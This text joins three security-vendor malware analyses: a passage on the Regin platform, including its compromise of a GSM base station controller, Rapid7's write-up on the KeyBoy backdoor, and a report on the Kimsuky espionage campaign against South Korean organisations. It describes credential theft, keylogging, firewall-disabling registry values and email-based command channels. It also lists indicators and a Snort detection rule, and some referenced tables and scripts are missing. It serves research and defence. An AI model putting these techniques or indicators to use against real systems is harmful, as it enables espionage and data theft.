The configuration block contains the names of two system directories that hold the encrypted third stage in their extended attributes .
It also has the name of a registry value that may hold the body of the third stage in case the EAs are missing ( for computers with a FAT / FAT32-formatted system disk ) .
Once the encrypted third stage is read from the registry or NTFS EAs , it is decrypted using the RC5 algorithm and a fixed 16-byte key that is hardcoded in the second stage .
Then , it is decompressed using the NRV2e algo- rithm from the open - source UCL library .
The second stage module loads the resulting binary in memory , vali- dates that it is a valid PE file , and calls its entry point in a system thread .
The second stage also creates a marker file that can be used to identify the infected machine .
Known filenames for this marker are : • % SYSTEMROOT % \system32\nsreg1.dat • % SYSTEMROOT % \system32\bssec3.dat • % SYSTEMROOT % \system32\msrdc64.dat These files have their timestamp set to the timestamp of the system file ' % SYSTEMROOT % \system32\lsass.exe ' The second stage has additional code for removing the startup code of Regin if signaled by the third stage .
Its configuration data contains the locations of the first three stages , including registry keys , names of the directo- ries that hold the encrypted EAs , and the location of the initial driver .
Essentially , the second stage can remove all the Regin stages from the system , effectively cleaning the machine and leaving only the encrypted VFS behind .
The 64-bit version of the second stage loader is a PE DLL module , since the 64-bit bootstrap chain operates in user mode .
Just like the first stage , it loads the encrypted body of the next stage from the end of the physical disk and decrypts it with a hardcoded RC5 key , then decompresses it using the nrv2 algorithm from the UCL library .
After decryption and decompression , the code checks if the next stage is a Windows PE DLL module , and if it is , it loads and executes it .
On 32-bit systems , the third stage is implemented as a driver module and provides the basic functionality of the malicious framework .
It is responsible for operating the encrypted virtual file system and loading additional plugins , and also provides several built - in plugins for the entire framework .
The module initializes the framework , sets up the plugin system and starts the actual work cycle of the malware .
It also passes execution to the plugin i d 50221 that is loaded from the VFS .
Built - in plugins provided by this module are : On 64-bit Windows systems , stage 3 is missing .
Stage 2 loads the dispatcher directly from the disk and runs it .
It is loaded directly as the third stage of the 64-bit bootstrap process , or extracted and loaded from the VFS as module 50221 as the fourth stage on 32-bit systems .
It implements a set of internal plugins : The dispatcher takes care of the most complicated tasks of the Regin platform , such as providing an API to access virtual file systems , basic communications and storage functions , as well as network transport sub- routines .
In essence , the dispatcher is the brain that runs the entire platform .
The most interesting code from the Regin platform is stored in encrypted file storages , known as Virtual File Systems ( VFSes ) .
During our analysis we were able to obtain 24 VFSes from multiple victims around the world .
Generally , these have random names and can be located in several places in the infected system : Each VFS has a structure that is very similar to a real disk file system such as FAT .
The VFS files start with a header that provides basic information required to operate the file system .
The header is followed by the bitmap of used/ free sectors and then by the file table .
Files are described by file table entries : Each sector starts with a 32-bit integer that is the offset of the next sector of the file .
Although the structures of the file system are unencrypted , the file entries are encrypted .
The encryption algo- rithm used is RC5 , and many records are also compressed using the nrv2e algorithm from the UCL library .
The reason why the attackers chose UCL is simple : it 's small , compact and requires little to no additional memory for decompression .
Each VFS we encountered was encrypted with a 16 bytes key , which can vary from victim to victim .
Based on our experience , most files were however encrypted with the same key , { 73 23 1F 43 93 E1 9F 2F 99 0C 17 81 5C FF B4 01 } stored in the dispatcher module or VMEM.sys kernel core .
In all , we observed about a dozen different VFS keys .
The following plugins were observed inside the VFSes we collected .
These are all identified by a 16-bit number .
The plugins are referenced by these numbers ; they are like filenames on a normal file system and allow the dispatcher to easily load or reference them .
The binary modules are referenced by these numbers as plugin identifiers and usually have similar internal DLL names ; e.g. , the plugin with ID ' 50121 ' will have the internal name ' 50121.dll ' in its export table .
Compressed binary modules are accompanied by binary files with the same ID .
These files contain the size of the decom- pressed module and are not included in the description .
Known data blocks and their configuration IDs : Known executable modules and their plugin IDs : The attackers can dynamically add and delete plugins inside the VFS and each victim installation has a different set of plugins depending on the type of activity the attackers need to execute .
For example , only some of the VFSes we have seen had lateral movement modules , designed for infecting other computers in the network .
In this section we describe some of the most interesting findings about Regin .
With high - end APT groups such as the one behind Regin , mistakes are very rare .
Nevertheless , they do happen .
Some of the VFSes we analyzed contain words that appear to be the respective codenames of the modules deployed on the victim : • legspinv2.6 and LEGSPINv2.6 • WILLISCHECKv2.0 • HOPSCOTCH Another module we found , which is a plugin type 55001.0 , references U_STARBUCKS : Finally , the word ' shit ' appears in many places throughout the code and modules .
The most interesting aspect we have found so far regarding Regin relates to an infection of a large GSM operator .
One VFS encrypted entry we located had internal i d 50049.2 , and appears to be an activity log on a GSM Base Station Controller .
According to the GSM documentation ( http : //www.telecomabc.com / b / bsc.html ) : ' The Base Station Controller ( BSC ) is in control of and supervises a number of Base Transceiver Stations ( BTS ) .
The BSC is responsible for the allocation of radio resources to a mobile call and for the handovers that are made between base stations under his control .
Other handovers are under the control of the MSC .
It also includes timestamps that indicate exactly when the command was executed .
The entries in the log appear to contain Ericsson OSS MML ( Man - Machine Language as defined by ITU - T ) commands ( see https : //en.wikipedia.org / wiki / Operations_support_system ) .
Here 's a list of some commands issued on the Base Station Controller , together with some of their timestamps : Descriptions for the commands : In total , the log indicates that commands were executed on 136 different cells .
Some of the cell names include ' prn021a , gzn010a , wdk004 , kbl027a , etc ...
The command log we obtained covers a period of about one month , from April 25 , 2008 through May 27 , 2008 .
It is unknown why the commands stopped in May 2008 though ; perhaps the infection was removed or the attackers achieved their objective and moved on .
Another explanation is that the attackers improved or changed the malware to stop saving logs locally and that is why only some older logs were discovered .
The C & C mechanism implemented in Regin is extremely sophisticated and relies on communication drones deployed by the attackers throughout the victim networks .
Most victims communicate with another machine in their own internal network through various protocols as specified in the config file .
These include HTTP and Windows network pipes .
The purpose of such a complex infrastructure is to achieve two goals : ( i ) to give attackers access deep into the network , potentially bypassing air gaps ; and ( ii ) to restrict as much as possible the traffic to the C & C .
Here 's a look at the decoded configurations : : In the above table we see configurations extracted from several victims that bridge together infected machines in what appears to be virtual networks : 17.3.40.x , 50.103.14.x , 51.9.1.x , 18.159.0.x .
One of these routes reaches out to the ' external ' C & C server at 203.199.89.80 .
The numbers right after the ' transport ' indicate the plugin that handles the communication .
These are in our case : • 27 - ICMP network listener using raw sockets • 50035 - Winsock - based network transport • 50037 - Network transport over HTTP • 50051 - Network transport over HTTPS • 50271 - Network transport over SMB ( named pipes ) The machines located on the border of the network act as routers , effectively connecting victims from inside the network with C & Cs on the Internet .
After decoding all the configurations we have collected , we were able to identify the following external C & Cs .
One particular case includes a country in the Middle East .
It was rather astonishing , so we thought it should be mentioned .
In this country all the victims we identified communicate with each other , forming a peer - to - peer network .
The P2P network includes the president 's office , a research center , an educational institution network and a bank .
Spread across the country , these victims are all interconnected with each other .
One of the victims contains a translation drone , which has the ability to forward packets outside the country , to the C & C in India .
This represents a rather interesting command - and - control mechanism , which is guaranteed to raise little suspi- cion .
For instance , if all commands to the president 's office are sent through the bank 's network , then all the malicious traffic visible to the president 's office sysadmins will only be with the bank , in the same country .
Over the past two years we have been collecting statistics on the attacks and victims of Regin .
These were aided by the fact that even after the malware is uninstalled , certain artifacts are left behind , which can help identify an infected ( but cleaned ) system .
For instance , we have seen several cases where the systems were cleaned but the ' msrdc64.dat ' infection marker was left behind .
So far , victims of Regin have been identified in 14 countries : • Afghanistan • Indonesia • Algeria • Iran • Belgium • Kiribati • Brazil • Malaysia • Fiji • Pakistan • Germany • Russia • India • Syria In total , we counted 27 different victims , although it should be pointed out that the definition of a victim here refers to a full entity , including its entire network .
The number of unique PCs infected with Regin is of course much , much higher .
From the map above , Fiji and Kiribati are unusual , because we rarely see such advanced malware in such remote , tiny countries .
In particular , the victim in Kiribati is most unusual .
To put this into context , Kiribati is a small island in the Pacific with a population around 100,000 .
According to experts , Kiribati is probably going to become one of the first victims of global warming , as it will be under water by 2050 .
While attribution remains a very difficult problem when it comes to professional attackers such as the ones behind Regin , certain metadata extracted from the samples is still worth a look .
We have collected timestamps from samples , which are normally put automatically by the development software : As this information could be easily altered by the developers , it is up to the reader to attempt to interpret this : as an intentional false flag , or a non - critical indicator left by the developers .
More information about Regin is available to Kaspersky Intelligent Services ' clients .
Contact : intelreports @ kaspersky.com For more than a decade , a sophisticated group known as Regin has targeted high - profile entities around the world with an advanced malware platform .
As far as we can tell , the operation is still active , although the malware may have been upgraded to more sophisticated versions .
The most recent sample we have seen was from a 64-bit infection .
This infection was still active in the spring of 2014 .
The name Regin is apparently a switched around ' In Reg ' , short for ' In Registry ' , as the malware can store its modules in the registry .
This name and the detections first appeared in anti - malware products around March 2011 .
In some ways the platform reminds us of another sophisticated malware : Turla ( http : //securelist.com / analysis/ publications/65545/the - epic - turla - operation/ ) .
Some similarities include the use of virtual file systems and the deployment of communication drones to bridge networks together .
Yet through their implementation , coding methods , plugins , hiding techniques and flexibility , Regin surpasses Turla as one of the most sophisticated attack platforms we have ever analyzed .
The ability of this group to penetrate and monitor GSM networks is perhaps the most unusual and interesting aspect of these operations .
In today 's world , we have become too dependent on cellphone networks that rely on ancient communication protocols with little or no security available for the end user .
Although all GSM networks have mechanisms embedded that allow entities such as law enforcement to track suspects , there are other parties which can gain this ability and then abuse it to launch other types of attacks against mobile users .
Kaspersky Lab products detect modules from the Regin platform as : Trojan . Win32.Regin.gen and Rootkit . Win32.Regin .
If you detect a Regin infection in your network , contact us at : intelservices @ kaspersky.com Stage 1 files , 32 bit : 06665b96e293b23acc80451abb413e50 187044596bc1328efa0ed636d8aa4a5c 1c024e599ac055312a4ab75b3950040a 2c8b9d2885543d7ade3cae98225e263b 4b6b86c7fec1c574706cecedf44abded 6662c390b2bbbd291ec7987388fc75d7 b269894f434657db2b15949641a67532 b29ca4f22ae7b7b25f79c1d4a421139d b505d65721bb2453d5039a389113b566 26297dc3cd0b688de3b846983c5385e5 ba7bb65634ce1e30c1e5415be3d1db1d bfbe8c3ee78750c3a520480700e440f8 d240f06e98c8d3e647cbf4d442d79475 ffb0b9b5b610191051a7bdf0806e1e47 Unusual stage 1 files apparently compiled from various public source codes merged with malicious code : 01c2f321b6bfdb9473c079b0797567ba 47d0e8f9d7a6429920329207a32ecc2e 744c07e886497f7b68f6f7fe57b7ab54 db405ad775ac887a337b02ea8b07fddc Stage 1 , 64-bit system infection : bddf5afbea2d0eed77f2ad4e9a4f044d c053a0a3f1edcbbfc9b51bc640e808ce e63422e458afdfe111bd0b87c1e9772c Stage 2 , 32 bit : 18d4898d82fcb290dfed2a9f70d66833 b9e4f9d32ce59e7c4daf6b237c330e25 Stage 2 , 64 bit : d446b1ed24dad48311f287f3c65aeb80 Stage 3 , 32 bit : 8486ec3112e322f9f468bdea3005d7b5 da03648948475b2d0e3e2345d7a9bbbb Stage 4 32 bit : 1e4076caa08e41a5befc52efd74819ea 68297fde98e9c0c29cecc0ebf38bde95 6cf5dc32e1f6959e7354e85101ec219a 885dcd517faf9fac655b8da66315462d a1d727340158ec0af81a845abd3963c1 Stage 4 64 bit : de3547375fbf5f4cb4b14d53f413c503 Note : Stages 2,3 and 4 do not appear on infected systems as real files on disk .
Hashes are provided for research purposes only .
In our never - ending quest to spot and expose the nastiest of the Internet , me and Mark this time incidentally stepped into a targeted attacks campaign apparently directed at a distributed and diversified base of victims .
In this blog post we 'll analyze two specific incidents apparently targeting victims in Vietnam and in India and we 'll describe the capabilities of the custom backdoor being used that for convenience ( and to our knowledge , for a lack of an existing name ) we call KeyBoy , due to a string present in one of the samples .
We 'll describe how the attackers operate these backdoors , provide some scripts useful to further investigate the campaign as well as meanings to detect infections or scout for additional samples .
We encountered the first document exploit called `` THAM luan- GD- NCKH2.doc '' a few days ago , which appears to be leveraging some vulnerabilities patched with MS12 - 060 .
When opened with a vulnerable version of Microsoft Word , the exploit will initiate the infection routine and display the legitimate document that follows : This document , written in Vietnamese , appears to be reviewing and discussing best practices for teaching and researching scientific topics .
We have no knowledge on the identity of the target , but we can assume he might part of the Vietnamese academic community .
The document is named to Nguyen Anh Tuan , which is presented as author of this crafted text .
Following are the hashes of the exploit file : THAM luan- GD- NCKH2.doc When executed the exploit initially creates and launches a dropper at location % Temp % \svchost.exe with the following hashes : svchost.exe This payload then creates a DLL file in system32 called CREDRIVER.dll , which is in fact the actual backdoor : CREDRIVER.dll We also identified another document exploiting CVE-2012 - 0158 , but this time apparently targeting some Indian individuals .
The content of the document is the following : This time the bait appears to be related to the state of telecommunication infrastructure in the district of Calcutta in India , discussing the coverage of GSM networks and availability and stability of broadband connections .
Also for this intrusion we ca n't know the identity of the target , but our hypothesis is either someone in the telecommunications industry or a representative of the local government .
In this case this crafted document pretends to be authored by someone called Amir Kumar Gupta .
All backdoors appear to be compiled on April 1st 2013 , suggesting that the attacks are reasonably recent .
For the sake of this analysis we 'll take the Vietnamese backdoor as an example ; the one found in the Indian attack operates in the exact same way .
As mentioned , when the exploit is opened a dropper is created and launched , which then takes care of creating a Windows service called MdAdum , which is then visible in the registry as follows : The dropper then launches the service with the DLL located at C : \WINDOWS\system32\CREDRIVER.dll and deletes itself .
Resilience on the system is guaranteed by the use of such service which will be executed at every start up .
Note that the Indian attack does not make use of this middle - stage dropper , but directly installs and launches the Windows service instead .
This backdoor has several features including : 1 .
Steal credentials from Internet Explorer 2 .
Steal credentials from Mozilla Firefox 3 .
Install a keylogger for intercepting credentials on Google Chrome 4 .
Operate in an interactive mode to allow the attacker to perform additional investigation on the compromised system and exfiltrate data .
Following you can see the portion of the code where the backdoor , after having verified which version of Mozilla Firefox is installed on the system , decides which technique to use to recover the credentials from the browser 's local storage .
In older versions of Firefox , credentials were stored in several .txt
In the following snipped you see the SQL statement to extract the data : Just in the same way , the backdoor attempts to collect password autocomplete from Internet Explorer : The backdoor also creates a separate thread that installs a Windows hook procedure on message WH_KEYBOARD_LL , through which it can intercept keystrokes .
We believe this is mainly used to intercept credentials from other browsers , specifically Google Chrome : The backdoor tries to contact the following domains until it gets a response from an active one : silence.phdns01.com cpnet.phmail.us imlang.phmail.org The Indian backdoor tries to contact the following domains instead : cresy.zyns.com preter.epac.to backto.ddns.name In the first set of domains they are either registered with Whois proxy services or with fake identities .
In the second set they are making use of a dynamic DNS service by ChangeIP.com .
Following are traces collected from passive DNS data relevant to the hosts involved in these attacks : This is an initial request that the backdoor would send out on port 443 to an active C & C : 00000000 c4 4c 87 3f 11 1e c4 1a 2c a9 12 1a 19 61 82 de |.L .
G. & G. & ...
At the time of the analysis all the C & C servers were not responding , we started reverse engineering the communication protocol and noticed that it simply used a multiply with 0x69 to encode the traffic sent to the controllers .
You can easily decode the content of the payload with the following Python snippet : The previous packet decodes to the following : $ login $ LAB 192.168.56.101 MyUser 2013/06/06 23:56:24 Proxy 20130401 While reverse engineering the backdoor we noticed that the malware expects the following messages from the C & C server it contacts : Sysinfo FileManager Download UploadFileOk Shell Intrigued by its capabilities , we started reconstructing the communication protocol and practically building a tool that would operate just like the original controller used by the attackers .
The following is a preliminary Python script that implements the protocol used by the malware and allows you to interact with it : 1 .
Here you can see the bot beaconing in and requiring for authentication ( funny enough the password is '' test '' , while the Indian sample uses `` dns.com '' ) : [ * ] C & C Running on 0.0.0.0:443 [ + ] New client connected : ( ' 192.168.56.110 ' , 1443 ) $ login $ LAB 192.168.56.110 MyUser 2013/06/07 02:18:35 Proxy 20130401 [ + ] Authenticating on the bot OnLine Pw_OK When the authentication is confirmed , we are prompted with a shell through which we can interact in real - time with the bot .
The messages we previously identified represent the actual commands that can be sent to the bot : Sysinfo : returns detailed information on the computer ( pretty much the output of systeminfo ) ; the bot will respond with a message with the header $ sysinfo $ .
Download : download a file from the compromised system ; the bot will respond with a message with the header $ fileDownload $ .
Most interestingly the command Shell spawns a Windows command shell that we can control remotely : shell > Shell $ shell $ Microsoft Windows XP [ Version 5.1.2600 ] ( C ) Copyright 1985 - 2001 Microsoft Corp. C : \WINDOWS\system32 > shell > tasklist $ shell $ tasklist $ shell $ C : \WINDOWS\system32 > While the interaction with the bots could also be scripted , it might be plausible that the operators of these intrusions might be interacting with their targets exclusively manually to collect different data depending on each individual they infected and the goals they had set for the attack .
While these are clearly not widespread attacks and , as in any other targeted attack case , we should not create alarmism for threats that are likely irrelevant for the majority of organizations , we want to share a few indicators that might help identify infections or assist in further research by whoever is interested in this campaign .
Firstly , thanks to the fixed patterns used by the malware in the authentication procedure , we can detect outbound traffic from infected hosts with the following simple Snort rule : alert tcp $ HOME_NET any - > $ EXTERNAL_NET any ( msg : '' KeyBoy Backdoor Login '' ; flow : to_server ; content : '' |c4 4c 87 3f 11 1e c4 1a| '' ; depth:8 ; sid:1000001 ; rev:1 ; classtype : trojan - activity ; reference : url , community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-tar geted - attacks- against - vietnam - and - india ) The simplest way to identify an infection on a given Windows system , is just to look for the existence of the file C : \WINDOWS\system32\CREDRIVER.dll or of a service called MdAdum .
We also created a couple of Yara rules that you can use to scan your systems your collection of malware samples to identify copies of KeyBoy : Not a day passes by without hearing of someone hit by a targeted attack .
Recently the growth of amount and scale of targeted attacks has come to the point were they are starting to look more like opportunistic carpet bombings rather than ninja strikes .
It 's common to observe attacks pulled off successfully without any particular sophistication in place , including the incidents described in this post .
It 's also getting quite difficult to attribute the attacks to any state - sponsored unit , both because there 's a generic lack of strong evidence in such incidents ( which is why we refrained from making any statement on the origin of these intrusions ) but frankly also because almost anybody could operate such campaigns and be reasonably successful .
The only differentiation between actors at this point exclusively relies on identifying the motivations and the context .
Beware though , just because these attacks are conceptually targeted , it does n't necessarily mean that they should have a higher priority than any other threat on your security program .
Our suggestion remains the same : identify your core assets , recognize the most impactful threats to such assets and inform and protect yourself accordingly .
This research was brought to you by Claudio Guarnieri and Mark Schloesser from Rapid7 Labs .
For several months , we have been monitoring an ongoing cyber - espionage campaign against South Korean think - tanks .
There are multiple reasons why this campaign is extraordinary in its execution and logistics .
It all started one day when we encountered a somewhat unsophisticated spy program that communicated with its `` master '' via a public e - mail server .
This approach is rather inherent to many amateur virus - writers and these malware attacks are mostly ignored .
However , there were a few things that attracted our attention : The public e - mail server in question was Bulgarian - mail.bg .
The compilation path string contained Korean hieroglyphs .
These two facts compelled us take a closer look at this malware -- Korean compilers alongside Bulgarian e- mail command - and - control communications .
The complete path found in the malware presents some Korean strings : D : rsh UAC_dll ( ) Releasetest.pdb The `` rsh '' word , by all appearances , means a shortening of `` Remote Shell '' and the Korean words can be translated in English as `` attack '' and `` completion '' , i.e .
According to our technical analysis , the attackers were interested in targeting following organizations '' .
The Sejong Institute The Sejong Institute is a non - profit private organization for public interest and a leading think tank in South Korea , conducting research on national security strategy , unification strategy , regional issues , and international political economy .
Korea Institute For Defense Analyses ( KIDA ) KIDA is a comprehensive defense research institution that covers a wide range of defense - related issues .
Ministry of Unification The Ministry of Unification is an executive department of the South Korean government responsible for working towards the reunification of Korea .
Its major duties are : establishing North Korea Policy , coordinating inter - Korean dialogue , pursuing inter - Korean cooperation and educating the public on unification .
Hyundai Merchant Marine Hyundai Merchant Marine is a South Korean logistics company providing worldwide container shipping services .
Some clues also suggest that computers belonging to `` The supporters of Korean Unification '' ( http : //www.unihope.kr/ ) were also targeted .
Among the organizations we counted , 11 are based in South Korea and two entities reside in China .
Partly because this campaign is very limited and highly targeted , we have not yet been able to identify how this malware is being distributed .
The malicious samples we found are the early stage malware most often delivered by spear - phishing e - mails .
The initial Trojan dropper is a Dynamic Link Library functioning as a loader for further malware .
It does not maintain exports and simply delivers another encrypted library maintained in its resource section .
This second library performs all the espionage functionality .
When running on Windows 7 , the malicious library uses the Metasploit Framework 's open - source code Win7Elevate to inject malicious code into explorer.exe .
In any case , be it Windows 7 or not , this malicious code decrypts its spying library from resources , saves it to disk with an apparently random but hardcoded name , for example , ~DFE8B437DD7C417A6D.TMP , in the user 's temporary folder and loads this file as library .
This next stage library copies itself into the System32 directory of the Windows folder after the hardcoded file name -- either KBDLV2.DLL or AUTO.DLL , depending on the malware sample .
Then the service is created for the service dll .
Service names also can differ from version to version ; we discovered the following names -- DriverManage , WebService and WebClientManager .
These functions assure malware persistence in a compromised OS between system reboots .
At this stage , the malware gathers information about the infected computer .
This includes an output of the systeminfo command saved in the file oledvbs.inc by following the hardcoded path : C : Program FilesCommon FilesSystemOle DBoledvbs.inc .
There is another function called - the malware creates a string containing computer and user names but this is n't used anywhere .
By all appearances , this is a mistake by the malware author .
Later on , we will come to a function where such a string could be pertinent but the malware is not able to find this data in the place where it should be .
These steps are taken only if it 's running on an infected system for the first time .
At system startup , the malicious library performs spying activities when it confirms that it is loaded by the generic svchost.exe process .
There are a lot of malicious programs involved in this campaign but , strangely , they each implement a single spying function .
Besides the basic library ( KBDLV2.DLL / AUTO.DLL ) that is responsible for common communication with its campaign master , we were able to find modules performing the following functions : Keystroke logging Directory listing collection HWP document theft Remote control download and execution Remote control access At system startup , the basic library disables the system firewall and any AhnLab firewall ( a South Korean security product vendor ) by zeroing out related values in registry : SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyStandardProfile EnableFirewall = 0 SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyPublicProfile EnableFirewall = 0 HKLMSOFTWAREAhnLabV3IS2007InternetSec FWRunMode = 0 HKLMSOFTWAREAhnlabV3IS80is fwmode = 0 It also turns off the Windows Security Center service to prevent alerting the user about the disabled firewall .
It is not accidental that the malware author has singled out AhnLab 's security product .
During our Winnti research , we learnt that one of the Korean victims was severely criticized by South Korean regulators for using foreign security products .
We do not know for sure how this criticism affected other South Korean organizations , but we do know that many South Korean organizations install AhnLab security products .
Accordingly , these attackers do n't even bother evading foreign vendors ' products , because their targets are solely South Korean .
Once the malware disables the AhnLab firewall , it checks whether the file taskmgr.exe is located in the hardcoded C : WINDOWS folder .
If the file is present , it runs this executable .
Next , the malware loops every 30 minutes to report itself and wait for response from its operator .
Communication between bot and operator flows through the Bulgarian web - based free email server ( mail.bg ) .
The bot maintains hardcoded credentials for its e - mail account .
After authenticating , the malware sends e - mails to another specified e - mail address , and reads e - mails from the inbox .
All these activities are performed via the `` mail.bg '' web - interface with the use of the system Wininet API functions .
From all the samples that we managed to obtain , we extracted the following email accounts used in this campaign : beautifl @ mail.bg ennemyman @ mail.bg fasionman @ mail.bg happylove @ mail.bg lovest000 @ mail.bg monneyman @ mail.bg sportsman @ mail.bg veryhappy @ mail.bg Here are the two `` master '' email addresses to which the bots send e - mails on behalf of the above- mentioned accounts .
They report on status and transmit infected system information via attachments : iop110112 @ hotmail.com rsh1213 @ hotmail.com To report infection status , the malware reads from C : Program FilesCommon FilesSystemOle DBoledvbs.inc which contains the systeminfo command output .
If the file exists , it is deleted after reading .
Then , it reads user - related info from the file sqlxmlx.inc in the same folder ( we can see strings referencing to `` UserID '' commentary in this part of the code ) .
But this file was never created .
As you recall , there is a function that should have collected this data and should have saved it into this sqlxmlx.inc file .
However , on the first launch , the collected user information is saved into `` xmlrwbin.inc '' .
This effectively means that the malware writer mistakenly coded the bot to save user information into the wrong file .
There is a chance for the mistaken code to still work -- user information could be copied into the send information heap .
But not in this case - at the time of writing , the gathered user information variable which should point to the xmlrwbin.inc filename has not yet been initialized , causing the file write to fail .
We see that sqlxmlx.inc is not created to store user information .
Next , the intercepted keystrokes are read from the file and sent to the master .
Keystrokes are logged and kept in an ordinary and consistent format in this file - both the names of windows in which keys were typed and the actual sequence of keyboard entry .
This data is found in the file C : Program FilesCommon FilesSystemOle DBmsolui80.inc created by the external key logger module .
All this data is merged in one file xmlrwbin.inc , which is then encrypted with RC4 .
The RC4 key is generated as an MD5 hash of a randomly generated 117-bytes buffer .
To be able to decipher the data , the attacker should certainly know either the MD5 hash or the whole buffer content .
This data is also sent , but RSA encrypted .
The malware constructs a 1120 bit public key , uses it to encrypt the 117-bytes buffer .
The malware then concatenates all the data to be sent as a 128-bytes block .
The resulting data is saved in C : Program FilesCommon FilesSystemOle DB to a file named according to the following format : '' < system time > _ < account at Bulgarian email server > .txt
The file is then attached to an e - mail and sent to the master 's e - mail account .
Following transmission , it is immediately deleted from the victim system .
The malware also retrieves instructions from the mail server .
It checks for mails in its Bulgarian e - mail account with a particular subject tag .
We have identified several `` subject tags '' in the network communication : Down_0 , Down_1 , Happy_0 , Happy_2 and ddd_3 .
When found and the e - mail maintains an attachment , the malware downloads this attachment and saves it with filename '' msdaipp.cnt '' in C : Program FilesCommon FilesSystemOle DB .
The attacker can send additional executables in this way .
The executables are RC4 encrypted and then attached .
The key for decryption is hardcoded in the malicious samples .
It 's interesting that the same `` rsh ! @ ! # '' string is maintained across all known samples and is used to generate RC4 keys .
As described earlier , the malware computes the MD5 of this string and uses the hash as its RC4 key to decrypt the executable .
Then , the plain executable is dropped onto disk as `` sqlsoldb.exe '' and run , and then moved to the C : Windows folder with the file name '' taskmgr.exe '' .
The original e - mail and its attachment are then deleted from the Bulgarian e - mail inbox .
The additional key logger module is not very complex -- it simply intercepts keystrokes and writes typed keys into C : Program FilesCommon FilesSystemOle DBmsolui80.inc , and also records the active window name where the user pressed keys .
We saw this same format in the Madi malware .
There is also one key logger variant that logs keystrokes into C : WINDOWSsetup.log .
The next program sent to victims enumerates all the drives on the infected system and executes the following command on them : dir < drive letter > : /a /s /t /-c In practice , this command is written to C : WINDOWSmsdatt.bat and executed with output redirected to C : WINDOWSmsdatl3.inc .
As a result , the latter maintains a listing of all files in all the folders on the drive .
The malware later reads that data and appends it to content of the file C : Program FilesCommon FilesSystemOle DBoledvbs.inc .
At this point , `` oledvbs.inc `` already stores systeminfo output .
It 's interesting that one sample of the directory listing collector was infected with the infamous `` Viking '' virus of Chinese origin .
Some of this virus ' modifications were wandering in the wild for years and its authors or operators would never expect to see it end up in a clandestine APT - related spying tool .
For the attackers , this is certainly a big failure .
Not only does the original spying program have marks of well- known malware that can be detected by anti - malware products ; moreover the attackers are revealing their secret activities to cyber - criminal gangs .
However , by all appearances , the attackers noticed the unwanted addition to their malware and got rid of the infection .
This was the only sample bearing the Viking virus .
Due to expensive work of malware with variety of additional files , it 's not out of place to show these '' relationships '' in a diagram : This module intercepts HWP documents on an infected computer .
The HWP file format is similar to Microsoft Word documents , but supported by Hangul , a South Korean word processing application from the Hancom Office bundle .
Hancom Office is widely used in South Korea .
This malware module works independently of the others and maintains its own Bulgarian e - mail account .
The account is hardcoded in the module along with the master 's e - mail to which it sends intercepted documents .
It is interesting that the module does not search for all the HWP files on infected computer , but reacts only to those that are opened by the user and steals them .
This behavior is very unusual for a document - stealing component and we do not see it in other malicious toolkits .
The program copies itself as < Hangul full path > HncReporter.exe and changes the default program association in the registry to open HWP documents .
To do so , it alters following registry values : HKEY_CLASSES_ROOTHwp . Document.7shellopencommand or HKEY_CLASSES_ROOTHwp . Document.8shellopencommand By default , there is the registry setting `` < Hangul full path > Hwp.exe '' `` % 1 '' associating Hangul application '' Hwp.exe '' with .HWP
But the malicious program replaces this string with the following : `` < Hangul full path > HncReporter.exe `` `` % 1 '' .
So , when the user is opening any .HWP
Following this registry edit , any opened .HWP
After sending , the malware executes the real Hangul word processing application `` Hwp.exe '' to open the .HWP
The means the victim most likely will not notice the theft of the .HWP
The module 's sending routine depends on the following files in C : Program FilesCommon FilesSystemOle DB folder : xmlrwbin.inc , msdaipp.cnt , msdapml.cnt , msdaerr.cnt , msdmeng.cnt and oledjvs.inc .
An extra program is dedicated exclusively to download attachments out of incoming e - mails with a particular subject tag .
This program is similar to the pivot module but with reduced functionality : it maintains the hardcoded Bulgarian e - mail account , logs in , reads incoming e - mails and searches for the special subject tag `` Team '' .
When found , it loads the related attachment , drops it onto the hard drive as C : Program FilesCommon FilesSystemOle DBtaskmgr.exe and executes .
This particular executable arrives without any encryption .
It is also interesting that the malware author did not custom develop a backdoor program .
Instead , the author modified TeamViewer client version 5.0.9104 .
The initial executable pushed by attackers in e - mails related to the remote control module consists of three more executables .
Two of them are Team Viewer components themselves , and another is some sort of backdoor loader .
So , the dropper creates three files in the C : WindowsSystem32 directory : netsvcs.exe - the modified Team Viewer client ; netsvcs_ko.dll - resources library of Team Viewer client ; vcmon.exe - installer / starter ; and creates the service `` Remote Access Service '' , adjusted to execute C : WindowsSystem32vcmon.exe at system startup .
Every time the vcmon.exe is executed , it disables AhnLab 's firewall by zeroing out following registry values : HKLMSOFTWAREAhnLabV3 365 ClinicInternetSec UseFw = 0 UseIps = 0 Then , it modifies the Team Viewer registry settings .
As we said , the Team Viewer components used in this campaign are not the original ones .
They are slightly modified .
In total , we found two different variants of changed versions .
The malware author replaced all the entries of `` Teamviewer '' strings in Team Viewer components .
In the first case with the `` Goldstager '' string and with the string `` Coinstager '' in the second .
The launcher sets up several registry values that control how the remote access tool will work .
Among them is SecurityPasswordAES .
This parameter represents a hash of the password with which a remote user has to connect to Team Viewer client .
This way , the attackers set a pre - shared authentication value .
After that , the starter executes the very Team Viewer client netsvcs.exe .
It 's interesting that the drop box mail accounts iop110112 @ hotmail.com and rsh1213 @ hotmail.com are registered with the following `` kim '' names : kimsukyang and `` Kim asdfa '' .
Of course , we ca n't be certain that these are the real names of the attackers .
However , the selection is n't frequently seen .
Perhaps it also points to the suspected North Korean origin of attack .
Taking into account the profiles of the targeted organizations -- South Korean universities that conduct researches on international affairs , produce defense policies for government , national shipping company , supporting groups for Korean unification -- one might easily suspect that the attackers might be from North Korea .
The targets almost perfectly fall into their sphere of interest .
On the other hand , it is not that hard to enter arbitrary registration information and misdirect investigators to an obvious North Korean origin .
It does not cost anything to concoct fake registration data and enter kimsukyang during a Hotmail registration .
We concede that this registration data does not provide concrete , indisputable information about the attackers .
However , the attackers ' IP - addresses do provide some additional clues .
During our analysis , we observed ten IP - addresses used by the Kimsuky operators .
All of them lie in ranges of the Jilin Province Network and Liaoning Province Network , in China .
No other IP - addresses have been uncovered that would point to the attackers ' activity and belong to other IP - ranges .
Interestingly , the ISPs providing internet access in these provinces are also believed to maintain lines into North Korea .
Finally , this geo - location supports the likely theory that the attackers behind Kimsuky are based in North Korea .
